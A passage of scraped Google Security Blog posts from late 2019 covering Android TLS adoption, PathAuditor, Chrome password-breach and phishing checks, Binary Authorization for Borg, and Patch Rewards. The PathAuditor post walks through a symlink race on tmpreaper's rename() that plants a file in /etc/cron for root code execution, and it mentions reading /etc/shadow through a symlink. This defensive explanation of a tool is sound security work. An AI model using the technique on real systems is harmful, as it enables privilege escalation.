program, such as those involving data exfiltration and lockscreen bypass. These rewards go up to $500,000 depending on the exploit category. For full details, please refer to the Android Security Rewards Program Rules page.    Now that we’ve covered some of what’s new, let’s take a look back at some milestones from this year. Here are some highlights from 2019:    Total payouts in the last 12 months have been over $1.5 million.     Over 100 participating researchers have received an average reward amount of over $3,800 per finding (46% increase from last year). On average, this means we paid out over $15,000 (20% increase from last year) per researcher!   The top reward paid out in 2019 was $161,337.   Top Payout    The highest reward paid out to a member of the research community was for a report from Guang Gong (@oldfresher) of Alpha Lab, Qihoo 360 Technology Co. Ltd. This report detailed the first reported 1-click remote code execution exploit chain on the Pixel 3 device. Guang Gong was awarded $161,337 from the Android Security Rewards program and $40,000 by Chrome Rewards program for a total of $201,337. The $201,337 combined reward is also the highest reward for a single exploit chain across all Google VRP programs. The Chrome vulnerabilities leveraged in this report were fixed in Chrome 77.0.3865.75 and released in September, protecting users against this exploit chain.    We’d like to thank all of our researchers for contributing to the security of the Android ecosystem. If you’re interested in becoming a researcher, check out our Bughunter University for information on how to get started.    Starting today November 21, 2019 the new rewards take effect. Any reports that were submitted before November 21, 2019 will be rewarded based on the previously existing rewards table.    Happy bug hunting!      ", "date": "November 21, 2019"},
{"website": "Google-Security", "title": "\n An Update on Android TLS Adoption\n", "author": [], "link": "https://security.googleblog.com/2019/12/an-update-on-android-tls-adoption.html", "abstract": "                                   Posted by Bram Bonné, Senior Software Engineer, Android Platform Security & Chad Brubaker, Staff Software Engineer, Android Platform Security           Android is committed to keeping users, their devices, and their data safe. One of the ways that we keep data safe is by protecting network traffic that enters or leaves an Android device with Transport Layer Security (TLS).      Android 7 (API level 24)  introduced  the  Network Security Configuration  in 2016, allowing app developers to configure the network security policy for their app through a declarative configuration file. To ensure apps are safe, apps targeting Android 9 (API level 28) or higher automatically have a  policy  set by default that prevents unencrypted traffic for every domain.     Today, we&#8217;re happy to announce that 80% of Android apps are encrypting traffic by default. The percentage is even greater for apps targeting Android 9 and higher, with 90% of them encrypting traffic by default.          Percentage of apps that block cleartext by default.     Since November 1 2019,  all app (updates as well as all new apps on Google Play) must target at least Android 9 . As a result, we expect these numbers to continue improving. Network traffic from these apps is secure by default and any use of unencrypted connections is the result of an explicit choice by the developer.     The latest releases of Android Studio and Google Play&#8217;s  pre-launch report  warn developers when their app includes a potentially insecure Network Security Configuration (for example, when they allow unencrypted traffic for all domains or when they accept user provided certificates outside of debug mode). This encourages the adoption of HTTPS across the Android ecosystem and ensures that developers are aware of their security configuration.          Example of a warning shown to developers in Android Studio.          Example of a warning shown to developers as part of the  pre-launch report .    What can I do to secure my app?      For apps targeting Android 9 and higher, the out-of-the-box default is to encrypt all network traffic in transit and trust only certificates issued by an authority in the standard Android CA set without requiring any extra configuration. Apps can provide an exception to this only by including a separate Network Security Config file with carefully selected exceptions.     If your app needs to allow traffic to certain domains, it can do so by including a Network Security Config file that only includes these exceptions to the default secure policy.  Keep in mind that you should be cautious about the data received over insecure connections as it could have been tampered with in transit.        &lt;network-security-config>     &lt;base-config cleartextTrafficPermitted=\"false\" />     &lt;domain-config cleartextTrafficPermitted=\"true\">         &lt;domain includeSubdomains=\"true\">insecure.example.com&lt;/domain>         &lt;domain includeSubdomains=\"true\">insecure.cdn.example.com&lt;/domain>     &lt;/domain-config> &lt;/network-security-config>      If your app needs to be able to accept user specified certificates for testing purposes (for example, connecting to a local server during testing), make sure to wrap your     element inside a     element. This ensures the connections in the production version of your app are secure.       &lt;network-security-config>     &lt;debug-overrides>         &lt;trust-anchors>             &lt;certificates src=\"user\"/>         &lt;/trust-anchors>     &lt;/debug-overrides> &lt;/network-security-config>     What can I do to secure my library?      If your library directly creates secure/insecure connections, make sure that it honors the app's cleartext settings by checking   isCleartextTrafficPermitted    before  opening any cleartext connection.    Android&#8217;s  built-in networking libraries  and other popular HTTP libraries such as  OkHttp  or  Volley  have built-in Network Security Config support.       Giles Hogben, Nwokedi Idika, Android Platform Security, Android Studio and Pre-Launch Report teams                                          Posted by Bram Bonné, Senior Software Engineer, Android Platform Security & Chad Brubaker, Staff Software Engineer, Android Platform Security     Android is committed to keeping users, their devices, and their data safe. One of the ways that we keep data safe is by protecting network traffic that enters or leaves an Android device with Transport Layer Security (TLS).    Android 7 (API level 24) introduced the Network Security Configuration in 2016, allowing app developers to configure the network security policy for their app through a declarative configuration file. To ensure apps are safe, apps targeting Android 9 (API level 28) or higher automatically have a policy set by default that prevents unencrypted traffic for every domain.   Today, we’re happy to announce that 80% of Android apps are encrypting traffic by default. The percentage is even greater for apps targeting Android 9 and higher, with 90% of them encrypting traffic by default.     Percentage of apps that block cleartext by default.   Since November 1 2019, all app (updates as well as all new apps on Google Play) must target at least Android 9. As a result, we expect these numbers to continue improving. Network traffic from these apps is secure by default and any use of unencrypted connections is the result of an explicit choice by the developer.   The latest releases of Android Studio and Google Play’s pre-launch report warn developers when their app includes a potentially insecure Network Security Configuration (for example, when they allow unencrypted traffic for all domains or when they accept user provided certificates outside of debug mode). This encourages the adoption of HTTPS across the Android ecosystem and ensures that developers are aware of their security configuration.     Example of a warning shown to developers in Android Studio.     Example of a warning shown to developers as part of the pre-launch report.  What can I do to secure my app?    For apps targeting Android 9 and higher, the out-of-the-box default is to encrypt all network traffic in transit and trust only certificates issued by an authority in the standard Android CA set without requiring any extra configuration. Apps can provide an exception to this only by including a separate Network Security Config file with carefully selected exceptions.   If your app needs to allow traffic to certain domains, it can do so by including a Network Security Config file that only includes these exceptions to the default secure policy. Keep in mind that you should be cautious about the data received over insecure connections as it could have been tampered with in transit.                            insecure.example.com           insecure.cdn.example.com             If your app needs to be able to accept user specified certificates for testing purposes (for example, connecting to a local server during testing), make sure to wrap your  element inside a  element. This ensures the connections in the production version of your app are secure.                                                         What can I do to secure my library?    If your library directly creates secure/insecure connections, make sure that it honors the app's cleartext settings by checking isCleartextTrafficPermitted before opening any cleartext connection.   Android’s built-in networking libraries and other popular HTTP libraries such as OkHttp or Volley have built-in Network Security Config support.    Giles Hogben, Nwokedi Idika, Android Platform Security, Android Studio and Pre-Launch Report teams      ", "date": "December 3, 2019"},
{"website": "Google-Security", "title": "\nDetecting unsafe path access patterns with PathAuditor\n", "author": ["Posted by Marta Ro", "ek, Google Summer Intern 2019, and Stephen R", "ttger, Software Engineer "], "link": "https://security.googleblog.com/2019/12/detecting-unsafe-path-access-patterns.html", "abstract": "                             Posted by Marta Ro  ż  ek, Google Summer Intern 2019, and Stephen R  ö  ttger, Software Engineer&nbsp;      #!/bin/sh cat /home/user/foo     What can go wrong if this command runs as root? Does it change anything if foo is a symbolic link to /etc/shadow? How is the output going to be used?    Depending on the answers to the questions above, accessing files this way could be a vulnerability. The vulnerability exists in syscalls that operate on file paths, such as open, rename, chmod, or exec. For a vulnerability to be present, part of the path has to be user controlled and the program that executes the syscall has to be run at a higher privilege level. In a potential exploit, the attacker can substitute the path for a symlink and create, remove, or execute a file. In many cases, it's possible for an attacker to create the symlink before the syscall is executed.    At Google, we have been working on a solution to find these potentially problematic issues at scale: PathAuditor. In this blog post we'll outline the problem and explain how you can avoid it in your code with PathAuditor.    Let&#8217;s take a look at a real world example. The  tmpreaper  utility contained the following code to check if a directory is a mount point:   if ((dst = malloc(strlen(ent-&gt;d_name) + 3)) == NULL)    &nbsp; &nbsp; &nbsp; &nbsp;message (LOG_FATAL, \"malloc failed.\\n\"); strcpy(dst, ent-&gt;d_name); strcat(dst, \"/X\"); rename(ent-&gt;d_name, dst); if (errno == EXDEV) { [...]     This code will call rename(\"/tmp/user/controlled\", \"/tmp/user/controlled/X\"). Under the hood, the kernel will resolve the path twice, once for the first argument and once for the second, then perform some checks if the rename is valid and finally try to move the file from one directory to the other.    However, the problem is that the user can race the kernel code and replace the &#8220;/tmp/user/controlled&#8221; with a symlink just between the two path resolutions.    A successful attack would look roughly like this:     Make &#8220;/tmp/user/controlled&#8221; a file with controlled content.   The kernel resolves that path for the first argument to rename() and sees the file.   Replace &#8220;/tmp/user/controlled&#8221; with a symlink to /etc/cron.   The kernel resolves the path again for the second argument and ends up in /etc/cron.   If both the tmp and cron directories are on the filesystem, the kernel will move the attacker controlled file to /etc/cron, leading to code execution as root.    Can we find such bugs via automated analysis? Well, yes and no. As shown in the tmpreaper example, exploiting these bugs can require some creativity and it depends on the context if they&#8217;re vulnerabilities in the first place. Automated analysis can uncover instances of this access pattern and will gather as much information as it can to help with further investigation. However, it will also naturally produce false positives.         We can&#8217;t tell if a call to open(/user/controlled, O_RDONLY) is a vulnerability without looking at the context. It depends on whether the contents are returned to the user or are used in some security sensitive way. A call to chmod(/user/controlled, mode) depending on the mode can be either a DoS or a privilege escalation. Accessing files in sticky directories (like /tmp) can become vulnerabilities if the attacker found an additional bug to delete arbitrary files.       How Pathauditor works       To find issues like this at scale we wrote  PathAuditor , a tool that monitors file accesses and logs potential vulnerabilities. PathAuditor is a shared library that can be loaded into processes using LD_PRELOAD. It then hooks all filesystem related libc functions and checks if the access is safe. For that, we traverse the path and check if any component could be replaced by an unprivileged user, for example if a directory is user-writable. If we detect such a pattern, we log it to syslog for manual analysis.    Here's how you can use it to find vulnerabilities in your code:      LD_PRELOAD the library to your binary and then analyse its findings in syslog. You can also add the library to /etc/ld.so.preload, which will preload it in all binaries running on the system.    It will then gather the PID and the command line of the calling process, arguments of the vulnerable function, and a stack trace -- this provides a starting point for further investigation. At this point, you can use the stack trace to find the code path that triggered the violation and manually analyse what would happen if you would point the path to an arbitrary file or directory.    For example, if the code is opening a file and returning the content to the user then you could use it to read arbitrary files. If you control the path of chmod or chown, you might be able to change the permissions of chosen files and so on.     PathAuditor has proved successful at Google and we're excited to share it with the community. The project is still in the early stages and we are actively working on it. We look forward to hearing about any vulnerabilities you discover with the tool, and hope to see pull requests with further improvements.         Try out the PathAuditor tool  here .                Marta Rożek was a Google Summer intern in 2019 and contributed to this blog and the PathAuditor tool                                                            Posted by Marta Rożek, Google Summer Intern 2019, and Stephen Röttger, Software Engineer   #!/bin/shcat /home/user/foo  What can go wrong if this command runs as root? Does it change anything if foo is a symbolic link to /etc/shadow? How is the output going to be used?  Depending on the answers to the questions above, accessing files this way could be a vulnerability. The vulnerability exists in syscalls that operate on file paths, such as open, rename, chmod, or exec. For a vulnerability to be present, part of the path has to be user controlled and the program that executes the syscall has to be run at a higher privilege level. In a potential exploit, the attacker can substitute the path for a symlink and create, remove, or execute a file. In many cases, it's possible for an attacker to create the symlink before the syscall is executed.  At Google, we have been working on a solution to find these potentially problematic issues at scale: PathAuditor. In this blog post we'll outline the problem and explain how you can avoid it in your code with PathAuditor.  Let’s take a look at a real world example. The tmpreaper utility contained the following code to check if a directory is a mount point: if ((dst = malloc(strlen(ent->d_name) + 3)) == NULL)        message (LOG_FATAL, \"malloc failed.\\n\");strcpy(dst, ent->d_name);strcat(dst, \"/X\");rename(ent->d_name, dst);if (errno == EXDEV) {[...]  This code will call rename(\"/tmp/user/controlled\", \"/tmp/user/controlled/X\"). Under the hood, the kernel will resolve the path twice, once for the first argument and once for the second, then perform some checks if the rename is valid and finally try to move the file from one directory to the other.  However, the problem is that the user can race the kernel code and replace the “/tmp/user/controlled” with a symlink just between the two path resolutions.  A successful attack would look roughly like this:  Make “/tmp/user/controlled” a file with controlled content. The kernel resolves that path for the first argument to rename() and sees the file. Replace “/tmp/user/controlled” with a symlink to /etc/cron. The kernel resolves the path again for the second argument and ends up in /etc/cron. If both the tmp and cron directories are on the filesystem, the kernel will move the attacker controlled file to /etc/cron, leading to code execution as root.  Can we find such bugs via automated analysis? Well, yes and no. As shown in the tmpreaper example, exploiting these bugs can require some creativity and it depends on the context if they’re vulnerabilities in the first place. Automated analysis can uncover instances of this access pattern and will gather as much information as it can to help with further investigation. However, it will also naturally produce false positives.    We can’t tell if a call to open(/user/controlled, O_RDONLY) is a vulnerability without looking at the context. It depends on whether the contents are returned to the user or are used in some security sensitive way. A call to chmod(/user/controlled, mode) depending on the mode can be either a DoS or a privilege escalation. Accessing files in sticky directories (like /tmp) can become vulnerabilities if the attacker found an additional bug to delete arbitrary files.   How Pathauditor works  To find issues like this at scale we wrote PathAuditor, a tool that monitors file accesses and logs potential vulnerabilities. PathAuditor is a shared library that can be loaded into processes using LD_PRELOAD. It then hooks all filesystem related libc functions and checks if the access is safe. For that, we traverse the path and check if any component could be replaced by an unprivileged user, for example if a directory is user-writable. If we detect such a pattern, we log it to syslog for manual analysis.  Here's how you can use it to find vulnerabilities in your code:   LD_PRELOAD the library to your binary and then analyse its findings in syslog. You can also add the library to /etc/ld.so.preload, which will preload it in all binaries running on the system.  It will then gather the PID and the command line of the calling process, arguments of the vulnerable function, and a stack trace -- this provides a starting point for further investigation. At this point, you can use the stack trace to find the code path that triggered the violation and manually analyse what would happen if you would point the path to an arbitrary file or directory.  For example, if the code is opening a file and returning the content to the user then you could use it to read arbitrary files. If you control the path of chmod or chown, you might be able to change the permissions of chosen files and so on.   PathAuditor has proved successful at Google and we're excited to share it with the community. The project is still in the early stages and we are actively working on it. We look forward to hearing about any vulnerabilities you discover with the tool, and hope to see pull requests with further improvements.    Try out the PathAuditor tool here.    Marta Rożek was a Google Summer intern in 2019 and contributed to this blog and the PathAuditor tool            ", "date": "December 9, 2019"},
{"website": "Google-Security", "title": "\nBetter password protections in Chrome - How it works\n", "author": ["Posted by Patrick Nepper, Kiran C. Nair, Vasilii Sukhanov and Varun Khaneja, Chrome Team"], "link": "https://security.googleblog.com/2019/12/better-password-protections-in-chrome.html", "abstract": "                             Posted by Patrick Nepper, Kiran C. Nair, Vasilii Sukhanov and Varun Khaneja, Chrome Team       Today, we  announced  better password protections in Chrome, gradually rolling out with release M79. Here are the details of how they work.         Warnings about compromised passwords    Google first  introduced  password breach warnings as a  Password Checkup extension  early this year. It compares passwords and usernames against over 4 billion credentials that Google knows to have been compromised. You can read more about it  here . In October, Google built the Password Checkup feature  into the Google Account , making it available from  passwords.google.com .      Chrome&#8217;s integration is a natural next step to ensure we protect even more users as they browse the web. Here is how it works:         Whenever Google discovers a username and password exposed by another company&#8217;s data breach, we store a hashed and encrypted copy of the data on our servers with a secret key known only to Google.     When you sign in to a website, Chrome will send a hashed copy of your username and password to Google encrypted with a secret key only known to Chrome. No one, including Google, is able to derive your username or password from this encrypted copy.     In order to determine if your username and password appears in any breach, we use a technique called  private set intersection with blinding  that involves multiple layers of encryption. This allows us to compare your encrypted username and password with all of the encrypted breached usernames and passwords, without revealing your username and password, or revealing any information about any other users&#8217; usernames and passwords. In order to make this computation more efficient, Chrome sends a 3-byte SHA256 hash prefix of your username to reduce the scale of the data joined from 4 billion records down to 250 records, while still ensuring your username remains anonymous.       Only you discover if your username and password have been compromised. If they have been compromised, Chrome will tell you, and we strongly encourage you to change your password.           You can control this feature in the &#8220; Sync and Google Services &#8221; section of Chrome Settings. Enterprise admins can control this feature using  the Password&#8203;Leak&#8203;Detection&#8203;Enabled policy setting .         Real-time phishing protection: Checking with Safe Browsing&#8217;s blocklist in real time.     Chrome&#8217;s new real-time phishing protection is also expanding existing technology &#8212; in this case it&#8217;s Google&#8217;s well-established  Safe Browsing.      Every day, Safe Browsing discovers thousands of new unsafe sites and adds them to the blocklists shared with the web industry. Chrome checks the URL of each site you visit or file you download against this local list, which is updated approximately every 30 minutes. If you navigate to a URL that appears on the list, Chrome checks a partial URL fingerprint (the first 32 bits of a SHA-256 hash of the URL) with Google for verification that the URL is indeed dangerous. Google cannot determine the actual URL from this information.      However, we&#8217;re noticing that some phishing sites slip through our 30-minute refresh window, either by switching domains very quickly or by hiding from Google's crawlers.      That&#8217;s where real-time phishing protections come in. These new protections can inspect the URLs of pages visited with Safe Browsing&#8217;s servers in real time. When you visit a website, Chrome checks it against a list stored on your computer of thousands of popular websites that are known to be safe. If the website is not on the safe-list, Chrome checks the URL with Google (after dropping any username or password embedded in the URL) to find out if you're visiting a dangerous site. Our analysis has shown that this results in a 30% increase in protections by warning users on malicious sites that are brand new.     We will be initially rolling out this feature for people who have already opted-in to &#8220; Make searches and browsing better &#8221; setting in Chrome. Enterprises administrators can manage this setting via the  Url&#8203;Keyed&#8203;Anonymized&#8203;Data&#8203;Collection&#8203;Enabled policy settings .        Expanding predictive phishing protection    Your password is the key to your online identity and data. If this key falls into the hands of attackers, they can easily impersonate you and get access to your data. We  launched  predictive phishing protections to warn users who are syncing history in Chrome when they enter their Google Account password into suspected phishing sites that try to steal their credentials.      With this latest release, we&#8217;re expanding this protection to everyone signed in to Chrome, even if you have not enabled Sync. In addition, this feature will now work for all the passwords you have stored in Chrome&#8217;s password manager.      If you type one of your protected passwords (this could be a password you stored in Chrome&#8217;s password manager, or the Google Account password you used to sign in to Chrome) into an unusual site, Chrome classifies this as a potentially dangerous event.      In such a scenario, Chrome checks the site against a list on your computer of thousands of popular websites that are known to be safe. If the website is not on the safe-list, Chrome checks the URL with Google (after dropping any username or password embedded in the URL). If this check determines that the site is indeed suspicious or malicious, Chrome will immediately show you a warning and encourage you to change your compromised password. If it was your Google Account password that was phished, Chrome also offers to notify Google so we can add additional protections to ensure your account isn't compromised.     By watching for password reuse, Chrome can give heightened security in critical moments while minimizing the data it shares with Google. We think predictive phishing protection will protect hundreds of millions more people.                                     Posted by Patrick Nepper, Kiran C. Nair, Vasilii Sukhanov and Varun Khaneja, Chrome Team    Today, we announced better password protections in Chrome, gradually rolling out with release M79. Here are the details of how they work.     Warnings about compromised passwords  Google first introduced password breach warnings as a Password Checkup extension early this year. It compares passwords and usernames against over 4 billion credentials that Google knows to have been compromised. You can read more about it here. In October, Google built the Password Checkup feature into the Google Account, making it available from passwords.google.com.    Chrome’s integration is a natural next step to ensure we protect even more users as they browse the web. Here is how it works:    Whenever Google discovers a username and password exposed by another company’s data breach, we store a hashed and encrypted copy of the data on our servers with a secret key known only to Google.   When you sign in to a website, Chrome will send a hashed copy of your username and password to Google encrypted with a secret key only known to Chrome. No one, including Google, is able to derive your username or password from this encrypted copy.   In order to determine if your username and password appears in any breach, we use a technique called private set intersection with blinding that involves multiple layers of encryption. This allows us to compare your encrypted username and password with all of the encrypted breached usernames and passwords, without revealing your username and password, or revealing any information about any other users’ usernames and passwords. In order to make this computation more efficient, Chrome sends a 3-byte SHA256 hash prefix of your username to reduce the scale of the data joined from 4 billion records down to 250 records, while still ensuring your username remains anonymous.     Only you discover if your username and password have been compromised. If they have been compromised, Chrome will tell you, and we strongly encourage you to change your password.    You can control this feature in the “Sync and Google Services” section of Chrome Settings. Enterprise admins can control this feature using the Password​Leak​Detection​Enabled policy setting.     Real-time phishing protection: Checking with Safe Browsing’s blocklist in real time.   Chrome’s new real-time phishing protection is also expanding existing technology — in this case it’s Google’s well-established Safe Browsing.   Every day, Safe Browsing discovers thousands of new unsafe sites and adds them to the blocklists shared with the web industry. Chrome checks the URL of each site you visit or file you download against this local list, which is updated approximately every 30 minutes. If you navigate to a URL that appears on the list, Chrome checks a partial URL fingerprint (the first 32 bits of a SHA-256 hash of the URL) with Google for verification that the URL is indeed dangerous. Google cannot determine the actual URL from this information.    However, we’re noticing that some phishing sites slip through our 30-minute refresh window, either by switching domains very quickly or by hiding from Google's crawlers.    That’s where real-time phishing protections come in. These new protections can inspect the URLs of pages visited with Safe Browsing’s servers in real time. When you visit a website, Chrome checks it against a list stored on your computer of thousands of popular websites that are known to be safe. If the website is not on the safe-list, Chrome checks the URL with Google (after dropping any username or password embedded in the URL) to find out if you're visiting a dangerous site. Our analysis has shown that this results in a 30% increase in protections by warning users on malicious sites that are brand new.   We will be initially rolling out this feature for people who have already opted-in to “Make searches and browsing better” setting in Chrome. Enterprises administrators can manage this setting via the Url​Keyed​Anonymized​Data​Collection​Enabled policy settings.    Expanding predictive phishing protection  Your password is the key to your online identity and data. If this key falls into the hands of attackers, they can easily impersonate you and get access to your data. We launched predictive phishing protections to warn users who are syncing history in Chrome when they enter their Google Account password into suspected phishing sites that try to steal their credentials.    With this latest release, we’re expanding this protection to everyone signed in to Chrome, even if you have not enabled Sync. In addition, this feature will now work for all the passwords you have stored in Chrome’s password manager.    If you type one of your protected passwords (this could be a password you stored in Chrome’s password manager, or the Google Account password you used to sign in to Chrome) into an unusual site, Chrome classifies this as a potentially dangerous event.    In such a scenario, Chrome checks the site against a list on your computer of thousands of popular websites that are known to be safe. If the website is not on the safe-list, Chrome checks the URL with Google (after dropping any username or password embedded in the URL). If this check determines that the site is indeed suspicious or malicious, Chrome will immediately show you a warning and encourage you to change your compromised password. If it was your Google Account password that was phished, Chrome also offers to notify Google so we can add additional protections to ensure your account isn't compromised.   By watching for password reuse, Chrome can give heightened security in critical moments while minimizing the data it shares with Google. We think predictive phishing protection will protect hundreds of millions more people.      ", "date": "December 10, 2019"},
{"website": "Google-Security", "title": "\nProtecting programmatic access to user data with Binary Authorization for Borg\n", "author": ["Posted by Daniel Rebolledo Samper and Mark Lodato, Software Engineers, Security & Privacy"], "link": "https://security.googleblog.com/2019/12/protecting-programmatic-access-to-user.html", "abstract": "                             Posted by Daniel Rebolledo Samper and Mark Lodato, Software Engineers, Security &amp; Privacy       At Google, the safety of user data is our paramount concern and we strive to protect it comprehensively. That includes protection from insider risk, which is the possible risk that employees could use their organizational knowledge or access to perform malicious acts. Insider risk also covers the scenario where an attacker has compromised the credentials of someone at Google to facilitate their attack. There are times when it&#8217;s necessary for our services and personnel to access user data as part of fulfilling our contractual obligations to you: as part of their role, such as user support; and programmatically, as part of a service. Today, we&#8217;re releasing a whitepaper, &#8220;Binary Authorization for Borg: how Google verifies code provenance and implements code identity,&#8221; that explains one of the mechanisms we use to protect user data from insider risks on Google's cluster management system  Borg .            Binary Authorization for Borg is a deploy-time enforcement check          Binary Authorization for Borg, or BAB, is an internal deploy-time enforcement check that reduces insider risk by ensuring that production software and configuration deployed at Google is properly reviewed and authorized, especially when that code has the ability to access user data. BAB ensures that code and configuration deployments meet certain standards prior to being deployed. BAB includes both a deploy-time enforcement service to prevent unauthorized jobs from starting, and an audit trail of the code and configuration used in BAB-enabled jobs.     BAB ensures that Google's official software supply chain process is followed. First, a code change is reviewed and approved before being checked into Google's central source code repository. Next, the code is verifiably built and packaged using Google's central build system. This is done by creating the build in a secure sandbox and recording the package's origin in metadata for verification purposes. Finally, the job is deployed to Borg, with a job-specific identity. BAB rejects any package that lacks proper metadata, that did not follow the proper supply chain process, or that otherwise does not match the identity&#8217;s predefined policy.            Binary Authorization for Borg allows for several kinds of security checks          BAB can be used for many kinds of deploy-time security checks. Some examples include:     Is the binary built from checked in code?   Is the binary built verifiably?   Is the binary built from tested code?   Is the binary built from code intended to be used in the deployment?    After deployment, a job is continuously verified for its lifetime, to check that jobs that were started (and any that may still be running) conform to updates to their policies.        Binary Authorization for Borg provides other security benefits   Though the primary purpose of BAB is to limit the ability of a potentially malicious insider to run an unauthorized job that could access user data, BAB has other security benefits. BAB provides robust code identity for jobs in Google&#8217;s infrastructure, tying a job&#8217;s identity to specific code, and ensuring that only the specified code can be used to exercise the job identity&#8217;s privileges. This allows for a transition from a job identity&#8212;trusting an identity and any of its privileged human users transitively&#8212;to a code identity&#8212;trusting a specific piece of reviewed code to have specific semantics and which cannot be modified without an approval process.    BAB also dictates a common language for data protection, so that multiple teams can understand and meet the same requirements. Certain processes, such as those for financial reporting, need to meet certain change management requirements for compliance purposes. Using BAB, these checks can be automated, saving time and increasing the scope of coverage.          Binary Authorization for Borg is part of the BeyondProd model   BAB is one of several technologies used at Google to mitigate insider risk, and one piece of how we secure containers and microservices in production. By using containerized systems and verifying their BAB requirements prior to deployment, our systems are easier to debug, more reliable, and have a clearer change management process. More details on how Google has adopted a cloud-native security model are available in another whitepaper we are releasing today,  &#8220;BeyondProd: A new approach to cloud-native security.&#8221;          In summary, implementing BAB, a deploy-time enforcement check, as part of Google&#8217;s containerized infrastructure and continuous integration and deployment (CI/CD) process has enabled us to verify that the code and configuration we deploy meet certain standards for security. Adopting BAB has allowed Google to reduce insider risk, prevent possible attacks, and also support the uniformity of our production systems. For more information about BAB, read our whitepaper,  &#8220;Binary Authorization for Borg: how Google verifies code provenance and implements code identity.&#8221;         Additional contributors to this whitepaper include Kevin Chen, Software Engineer; Tim Dierks, Engineering Director; Maya Kaczorowski, Product Manager; Gary O&#8217;Connor, Technical Writing; Umesh Shankar, Principal Engineer; Adam Stubblefield, Distinguished Engineer; and Wilfried Teiken, Software Engineer; with special recognition to the entire Binary Authorization for Borg team for their ideation, engineering, and leadership                                        Posted by Daniel Rebolledo Samper and Mark Lodato, Software Engineers, Security & Privacy  At Google, the safety of user data is our paramount concern and we strive to protect it comprehensively. That includes protection from insider risk, which is the possible risk that employees could use their organizational knowledge or access to perform malicious acts. Insider risk also covers the scenario where an attacker has compromised the credentials of someone at Google to facilitate their attack. There are times when it’s necessary for our services and personnel to access user data as part of fulfilling our contractual obligations to you: as part of their role, such as user support; and programmatically, as part of a service. Today, we’re releasing a whitepaper, “Binary Authorization for Borg: how Google verifies code provenance and implements code identity,” that explains one of the mechanisms we use to protect user data from insider risks on Google's cluster management system Borg.    Binary Authorization for Borg is a deploy-time enforcement check    Binary Authorization for Borg, or BAB, is an internal deploy-time enforcement check that reduces insider risk by ensuring that production software and configuration deployed at Google is properly reviewed and authorized, especially when that code has the ability to access user data. BAB ensures that code and configuration deployments meet certain standards prior to being deployed. BAB includes both a deploy-time enforcement service to prevent unauthorized jobs from starting, and an audit trail of the code and configuration used in BAB-enabled jobs. BAB ensures that Google's official software supply chain process is followed. First, a code change is reviewed and approved before being checked into Google's central source code repository. Next, the code is verifiably built and packaged using Google's central build system. This is done by creating the build in a secure sandbox and recording the package's origin in metadata for verification purposes. Finally, the job is deployed to Borg, with a job-specific identity. BAB rejects any package that lacks proper metadata, that did not follow the proper supply chain process, or that otherwise does not match the identity’s predefined policy.    Binary Authorization for Borg allows for several kinds of security checks    BAB can be used for many kinds of deploy-time security checks. Some examples include:  Is the binary built from checked in code? Is the binary built verifiably? Is the binary built from tested code? Is the binary built from code intended to be used in the deployment?  After deployment, a job is continuously verified for its lifetime, to check that jobs that were started (and any that may still be running) conform to updates to their policies.   Binary Authorization for Borg provides other security benefits Though the primary purpose of BAB is to limit the ability of a potentially malicious insider to run an unauthorized job that could access user data, BAB has other security benefits. BAB provides robust code identity for jobs in Google’s infrastructure, tying a job’s identity to specific code, and ensuring that only the specified code can be used to exercise the job identity’s privileges. This allows for a transition from a job identity—trusting an identity and any of its privileged human users transitively—to a code identity—trusting a specific piece of reviewed code to have specific semantics and which cannot be modified without an approval process.  BAB also dictates a common language for data protection, so that multiple teams can understand and meet the same requirements. Certain processes, such as those for financial reporting, need to meet certain change management requirements for compliance purposes. Using BAB, these checks can be automated, saving time and increasing the scope of coverage.    Binary Authorization for Borg is part of the BeyondProd model BAB is one of several technologies used at Google to mitigate insider risk, and one piece of how we secure containers and microservices in production. By using containerized systems and verifying their BAB requirements prior to deployment, our systems are easier to debug, more reliable, and have a clearer change management process. More details on how Google has adopted a cloud-native security model are available in another whitepaper we are releasing today, “BeyondProd: A new approach to cloud-native security.”    In summary, implementing BAB, a deploy-time enforcement check, as part of Google’s containerized infrastructure and continuous integration and deployment (CI/CD) process has enabled us to verify that the code and configuration we deploy meet certain standards for security. Adopting BAB has allowed Google to reduce insider risk, prevent possible attacks, and also support the uniformity of our production systems. For more information about BAB, read our whitepaper, “Binary Authorization for Borg: how Google verifies code provenance and implements code identity.”   Additional contributors to this whitepaper include Kevin Chen, Software Engineer; Tim Dierks, Engineering Director; Maya Kaczorowski, Product Manager; Gary O’Connor, Technical Writing; Umesh Shankar, Principal Engineer; Adam Stubblefield, Distinguished Engineer; and Wilfried Teiken, Software Engineer; with special recognition to the entire Binary Authorization for Borg team for their ideation, engineering, and leadership      ", "date": "December 17, 2019"},
{"website": "Google-Security", "title": "\nAnnouncing updates to our Patch Rewards program in 2020 \n", "author": ["Posted by Jan Keller, Technical Program Manager, Security "], "link": "https://security.googleblog.com/2019/12/announcing-updates-to-our-patch-rewards.html", "abstract": "                             Posted by Jan Keller, Technical Program Manager, Security&nbsp;       At Google, we strive to make the internet safer and that includes recognizing and rewarding security improvements that are vital to the health of the entire web. In 2020, we are building on this commitment by launching a new iteration of our  Patch Rewards program  for third-party open source projects.    Over the last six years, we have rewarded open source projects for security improvements after they have been implemented. While this has led to overall improved security, we want to take this one step further.     Introducing upfront financial help   Starting on January 1, 2020, we&#8217;re not only going to reward proactive security improvements  after the work is completed , but we will also complement the program with upfront financial support to provide an additional resource for open source developers to prioritize security work. For example, if you are a small open source project and you want to improve security, but don&#8217;t have the necessary resources, this new reward can help you acquire additional development capacity.          We will start off with two support levels :       Small ($5,000):  Meant to motivate and reward a project for fixing a small number of security issues. Examples: improvements to privilege separation or sandboxing, cleanup of integer artimetrics, or more generally fixing vulnerabilities identified in open source software by bug bounty programs such as  EU-FOSSA 2  (see &#8216;Qualifying submissions&#8217;  here  for more examples).    Large ($30,000):  Meant to incentivize a larger project to invest heavily in security, e.g. providing support to find additional developers, or implement a significant new security feature (e.g. new compiler mitigations).      Nomination process      Anyone can nominate an open source project for support by filling out  http://goo.gle/patchz-nomination . Our Patch Reward Panel will review submissions on a monthly basis and select a number of projects that meet the program criteria. The panel will let submitors know if a project has been chosen and will start working with the project maintainers directly.       Projects in scope          Any open source project can be nominated for support. When selecting projects, the panel will put an emphasis on projects that either are vital to the health of the Internet or are end-user projects with a large user base.       What do we expect in return?     We expect to see security improvements to open source software. Ideally, the project can provide us with a short blurb or pointers to some of the completed work that was possible because of our support. We don&#8217;t want to add bureaucracy, but would like to measure the success of the program.  What about the existing Patch Rewards program?   This is an addition to the existing program, the current  Patch Rewards program  will continue as it stands today.                                         Posted by Jan Keller, Technical Program Manager, Security   At Google, we strive to make the internet safer and that includes recognizing and rewarding security improvements that are vital to the health of the 